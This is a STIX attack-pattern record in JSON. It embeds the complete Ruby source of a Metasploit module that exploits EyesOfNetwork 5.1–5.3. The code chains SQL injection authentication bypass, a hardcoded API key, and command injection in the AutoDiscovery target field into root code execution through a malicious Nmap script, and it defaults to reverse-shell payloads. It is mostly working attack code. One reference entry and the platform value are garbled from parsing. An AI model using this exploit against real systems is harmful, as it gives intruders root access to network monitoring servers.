{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--efb36848-a6b0-4016-8bfd-44aeeb591706",
    "created": "2024-08-14T17:04:06.083071Z",
    "modified": "2024-08-14T17:04:06.083075Z",
    "name": "EyesOfNetwork 5.1-5.3 AutoDiscovery Target Command Execution",
    "description": " This module exploits multiple vulnerabilities in EyesOfNetwork version 5.1, 5.2 and 5.3 in order to execute arbitrary commands as root.  This module takes advantage of a command injection vulnerability in the `target` parameter of the AutoDiscovery functionality within the EON web interface in order to write an Nmap NSE script containing the payload to disk. It then starts an Nmap scan to activate the payload. This results in privilege escalation because the`apache` user can execute Nmap as root.  Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via various methods, depending on the EON version. EON 5.3 is vulnerable to a hardcoded API key and two SQL injection exploits. EON 5.1 and 5.2 can only be exploited via SQL injection. This module has been successfully tested on EyesOfNetwork 5.1, 5.2 and 5.3.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/eyesofnetwork_autodiscovery_rce.rb",
            "external_id": "eyesofnetwork_autodiscovery_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/h4knet/eonrce#exploitsforEON5.1-5.3thatcoverallCVEsmentionedabove"
        },
        {
            "source_name": "api=true#usedtocheckifanyofthe2apiexploitswork.Ifnot",
            "external_id": "CVE-2020-9465isattempted"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::SQLi\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'EyesOfNetwork 5.1-5.3 AutoDiscovery Target Command Execution',\n      'Description'     => %q{\n        This module exploits multiple vulnerabilities in EyesOfNetwork version 5.1, 5.2\n        and 5.3 in order to execute arbitrary commands as root.\n\n        This module takes advantage of a command injection vulnerability in the\n        `target` parameter of the AutoDiscovery functionality within the EON web\n        interface in order to write an Nmap NSE script containing the payload to\n        disk. It then starts an Nmap scan to activate the payload. This results in\n        privilege escalation because the`apache` user can execute Nmap as root.\n\n        Valid credentials for a user with administrative privileges are required.\n        However, this module can bypass authentication via various methods, depending on\n        the EON version. EON 5.3 is vulnerable to a hardcoded API key and two SQL\n        injection exploits. EON 5.1 and 5.2 can only be exploited via SQL injection.\n        This module has been successfully tested on EyesOfNetwork 5.1, 5.2 and 5.3.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Cl\u00e9ment Billac', # @h4knet - Discovery and exploits\n          'bcoles',         # Metasploit\n          'Erik Wynter'     # @wyntererik - Metasploit\n        ],\n      'References'      =>\n        [\n          ['CVE', '2020-8654'], # authenticated rce\n          ['CVE', '2020-8655'], # nmap privesc\n          ['CVE', '2020-8656'], # sqli auth bypass\n          ['CVE', '2020-8657'], # hardcoded API key\n          ['CVE', '2020-9465'], # sqli in user_id cookie field\n          ['EDB', '48025'], #exploit for EON 5.3 (does not cover CVE 2020-9465)\n          ['URL', 'https://github.com/h4knet/eonrce'] #exploits for EON 5.1-5.3 that cover all CVEs mentioned above\n        ],\n      'Payload'        => { 'BadChars' => \"\\x00\" },\n      'Targets'        =>\n        [\n          [ 'Linux (x86)', {\n            'Arch' => ARCH_X86,\n            'Platform' => 'linux',\n            'DefaultOptions' => {\n              'PAYLOAD'     => 'linux/x86/meterpreter/reverse_tcp'\n            }\n          } ],\n          [ 'Linux (x64)', {\n            'Arch' => ARCH_X64,\n            'Platform' => 'linux',\n            'DefaultOptions' => {\n              'PAYLOAD'     => 'linux/x64/meterpreter/reverse_tcp'\n            }\n          } ],\n          [ 'Linux (cmd)', {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix',\n            'DefaultOptions' => {\n              'PAYLOAD'     => 'cmd/unix/reverse_bash'\n            },\n          } ]\n        ],\n      'Privileged'      => true,\n      'DisclosureDate'  => '2020-02-06',\n      'DefaultOptions'  => {\n        'RPORT' => 443,\n        'SSL'     => true, #HTTPS is required for the module to work\n        },\n      'DefaultTarget'   => 1,\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        }\n      ))\n    register_options [\n      OptString.new('TARGETURI', [true, 'Base path to EyesOfNetwork', '/']),\n      OptString.new('SERVER_ADDR', [true, 'EyesOfNetwork server IP address (if different from RHOST)', '']),\n    ]\n  end\n\n  def nmap_path\n    '/usr/bin/nmap'\n  end\n\n  def server_addr\n    datastore['SERVER_ADDR'].blank? ? rhost : datastore['SERVER_ADDR']\n  end\n\n  def check\n    vprint_status(\"Running check\")\n\n    res_css = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'css/eonweb.css')\n\n    unless res_css\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    unless res_css.code == 200\n      return CheckCode::Safe('Target is not an EyesOfNetwork application.')\n    end\n\n    @version = res_css.body.to_s.split(\"VERSION :\")[1].split(\" \")[0]\n\n    if @version.to_s == ''\n      return CheckCode::Detected('Could not determine EyesOfNetwork version.')\n    end\n\n    if @version == '5.1'\n      return CheckCode::Appears(\"Target is EyesOfNetwork version 5.1.\")\n    end\n\n    #The css file for EON 5.2 and 5.3 both mentions version 5.2, so additional checks are needed\n    if @version != '5.2' #The module only works against EON 5.1, 5.2 and 5.3. Other versions are not considered vulnerable.\n      return CheckCode::NotVulnerable(\"Target is EyesOfNetwork version #{@version} and is not vulnerable.\")\n    end\n\n    res_api = send_request_cgi 'uri' => normalize_uri(target_uri.path, '/eonapi/getApiKey')\n\n    unless res_api\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    unless res_api.code == 401 && res_api.body.include?('api_version')\n      return CheckCode::Safe('Target is not an EyesOfNetwork application.')\n    end\n\n    api_version = res_api.get_json_document()['api_version'] rescue ''\n\n    if api_version.to_s == ''\n      return CheckCode::Detected('Could not determine EyesOfNetwork version.')\n    end\n\n    api_version = Rex::Version.new api_version\n\n    unless api_version <= Rex::Version.new('2.4.2')\n      return CheckCode::Safe(\"Target is EyesOfNetwork with API version #{api_version}.\")\n    end\n\n    #The only way to distinguish between EON 5.2 and 5.3 without authenticating is by checking the mod_perl version in the http response headers\n    #The official EON 5.2 VM runs Apache with mod_perl version 2.0.10, while the EON 5.3 VM runs Apache with mod_perl version 2.0.11\n    if res_api.headers.to_s.include?('mod_perl/2.0.10')\n      @version = '5.2'\n      return CheckCode::Appears(\"Target is EyesOfNetwork 5.2 with API version #{api_version}.\")\n    elsif res_api.headers.to_s.include?('mod_perl/2.0.11')\n      @version = '5.3'\n      return CheckCode::Appears(\"Target is EyesOfNetwork 5.3 or older with API version #{api_version}.\")\n    else\n      return CheckCode::Detected(\"Could not determine EyesOfNetwork version. API version is #{api_version}\")\n    end\n  end\n\n  def sqli_to_admin_session\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, '/login.php'),\n        'cookie' => \"user_id=' union select #{payload} -- ;\"\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n\n    # check if target is vulnerable to CVE-2020-9465\n\n    unless @sqli.test_vulnerable\n      fail_with Failure::NotVulnerable, 'The target does not seem vulnerable. You could try increasing the value of the advanced option \"SqliDelay\".'\n    end\n\n    print_good 'The target seems vulnerable.'\n\n    # Check if the admin user has a session opened, which is required for this exploit to work\n    admin_sessions = @sqli.run_sql('select if((select count(*) from sessions where user_id = 1) > 0,1,0)', output_charset: ('0' .. '1'))\n\n    if admin_sessions != '1'\n      fail_with Failure::NoAccess, 'The admin user has no active sessions.'\n      return\n    end\n\n    print_status 'Verified that the admin user has at least one active session.'\n\n    print_status(\"Calculating the admin 'session_id' value. This will take a while...\")\n\n    # Could have done : @sqli.dump_table_fields('database()', 'sessions', %w(session_id), 'user_id=1', 1)\n    @session_id = @sqli.run_sql('select session_id from sessions limit 1', output_charset: ('0'..'9'))\n    print_good(\"Obtained admin 'session_id' value: #{@session_id}\")\n    @cookie = \"session_id=#{@session_id}; user_name=admin; user_id=1; group_id=1;\"\n  end\n\n  def generate_api_key\n    default_key = \"\u20acOn@piK3Y\"\n    default_user_id = 1\n    key = Digest::MD5.hexdigest(default_key + default_user_id.to_s)\n    Digest::SHA256.hexdigest(key + server_addr)\n  end\n\n  def sqli_to_api_key\n    # Attempt to obtain the admin API key via SQL injection, using a fake password and its md5 encrypted hash\n    fake_pass = Rex::Text::rand_text_alpha(10)\n    fake_pass_md5 = Digest::MD5.hexdigest(\"#{fake_pass}\")\n    user_sqli = \"' union select 1,'admin','#{fake_pass_md5}',0,0,1,1,8 or '\"\n    api_res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri.path, \"/eonapi/getApiKey\"),\n      'method'    => 'GET',\n       'vars_get' => {\n        'username'   => user_sqli,\n        'password'   => fake_pass\n      }\n    })\n\n    unless api_res\n      print_error('Connection failed.')\n      return\n    end\n\n    unless api_res.code == 200 && api_res.get_json_document.include?('EONAPI_KEY')\n      print_error(\"SQL injection to obtain API key failed\")\n      return\n    end\n\n    api_res.get_json_document()['EONAPI_KEY']\n  end\n\n  def create_eon_user(user, password)\n    vprint_status(\"Creating user #{user} ...\")\n\n    vars_post = {\n      user_name:  user,\n      user_group: \"admins\",\n      user_password: password\n    }\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, '/eonapi/createEonUser'),\n      'ctype'    => 'application/json',\n      'vars_get' => {\n        'apiKey'   => @api_key,\n        'username' => @api_user\n      },\n      'data' => vars_post.to_json\n    })\n\n    unless res\n      print_warning(\"Failed to create user: Connection failed.\")\n      return\n    end\n\n    return res\n  end\n\n  def verify_api_key(res)\n    return false unless res.code == 200\n\n    json_data = res.get_json_document\n    json_res = json_data['result']\n    return false unless json_res && json_res['description']\n    json_res = json_res['description']\n\n    return true if json_res && json_res.include?('SUCCESS')\n\n    return false\n  end\n\n  def delete_eon_user(user)\n    vprint_status \"Removing user #{user} ...\"\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, '/eonapi/deleteEonUser'),\n      'ctype'    => 'application/json',\n      'data'     => { user_name: user }.to_json,\n      'vars_get' => { apiKey: @api_key, username: @api_user }\n    })\n\n    unless res\n      print_warning 'Removing user #{user} failed: Connection failed'\n      return\n    end\n\n    res\n  end\n\n  def login(user, pass)\n    vprint_status \"Authenticating as #{user} ...\"\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'login.php'),\n      'vars_post' => {\n        login: user,\n        mdp: pass\n      }\n    })\n\n    unless res\n      fail_with Failure::Unreachable, 'Connection failed'\n    end\n\n    unless res.code == 200 && res.body.include?('dashboard_view')\n      fail_with Failure::NoAccess, 'Authentication failed'\n    end\n\n    print_good \"Authenticated as user #{user}\"\n\n    @cookie = res.get_cookies\n\n    if @cookie.empty?\n      fail_with Failure::UnexpectedReply, 'Failed to retrieve cookies'\n    end\n\n    res\n  end\n\n  def create_autodiscovery_job(cmd)\n    vprint_status \"Creating AutoDiscovery job: #{cmd}\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, '/lilac/autodiscovery.php'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'request'          => 'autodiscover',\n        'job_name'         => 'Internal discovery',\n        'job_description'  => 'Internal EON discovery procedure.',\n        'nmap_binary'      => nmap_path,\n        'default_template' => '',\n        'target[]'         => cmd\n      }\n    })\n\n    unless res\n      fail_with Failure::Unreachable, 'Creating AutoDiscovery job failed: Connection failed'\n    end\n\n    unless res.body.include? 'Starting...'\n      fail_with Failure::Unknown, 'Creating AutoDiscovery job failed: Job failed to start'\n    end\n\n    res\n  end\n\n  def delete_autodiscovery_job(job_id)\n    vprint_status \"Removing AutoDiscovery job #{job_id} ...\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, '/lilac/autodiscovery.php'),\n      'cookie' => @cookie,\n      'vars_get' => {\n        id: job_id,\n        delete: 1\n      }\n    })\n\n    unless res\n      print_warning \"Removing AutoDiscovery job #{job_id} failed: Connection failed\"\n      return\n    end\n    res\n  end\n\n  def filter_bad_chars(cmd)\n  cmd.gsub!(/\"/, '\\\"')\n  end\n\n  def execute_command(cmd, opts = {})\n    nse = Rex::Text.encode_base64(\"local os=require \\\"os\\\" hostrule=function(host) os.execute(\\\"#{cmd}\\\") end action=function() end\")\n    nse_path = \"/tmp/.#{rand_text_alphanumeric 8..12}\"\n    nse_cmd = \"echo #{nse} | base64 -d > #{nse_path};sudo #{nmap_path} localhost -sn -script #{nse_path};rm #{nse_path}\"\n    if target.arch.first == ARCH_CMD\n      print_status \"Sending payload (#{nse_cmd.length} bytes) ...\"\n    end\n\n    res = create_autodiscovery_job \";#{nse_cmd} #\"\n    return unless res\n\n    job_id = res.body.scan(/autodiscovery.php\\?id=([\\d]+)/).flatten.first\n\n    if job_id.empty?\n      print_warning 'Could not retrieve AutoDiscovery job ID. Manual removal required.'\n      return\n    end\n    delete_autodiscovery_job job_id\n  end\n\n  def cleanup\n    super\n    if @username\n      delete_eon_user @username\n    end\n  end\n\n  def exploit\n    if @version != '5.3'\n      print_status \"Target is EyesOfNetwork version #{@version}. Attempting exploitation using CVE-2020-9465.\"\n      sqli_to_admin_session\n    else\n      print_status \"Target is EyesOfNetwork version #{@version} or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.\"\n      @api_user = 'admin'\n      @api_key = generate_api_key\n      print_status \"Using generated API key: #{@api_key}\"\n\n      @username = rand_text_alphanumeric(8..12)\n      @password = rand_text_alphanumeric(8..12)\n\n      create_res = create_eon_user @username, @password\n\n      api = true #used to check if any of the 2 api exploits work. If not, CVE-2020-9465 is attempted\n      unless verify_api_key(create_res)\n        @api_key = sqli_to_api_key\n        if @api_key\n          print_error(\"Generated API key does not match.\")\n          print_status(\"Using API key obtained via SQL injection: #{@api_key}\")\n          sqli_verify = create_eon_user @username, @password\n          api = false unless verify_api_key(sqli_verify)\n        else\n          api = false\n        end\n      end\n\n      if api\n        admin_group_id = 1\n        login @username, @password\n        unless @cookie.include? 'group_id='\n          @cookie << \"; group_id=#{admin_group_id}\"\n        end\n      else\n        print_error(\"Failed to obtain valid API key.\")\n        print_status(\"Attempting exploitation using CVE-2020-9465.\")\n        sqli_to_admin_session\n      end\n    end\n\n    if target.arch.first == ARCH_CMD\n      execute_command payload.encoded.gsub(/\"/, '\\\"')\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-06",
    "x_mitre_platforms": [
        "unix'"
    ]
}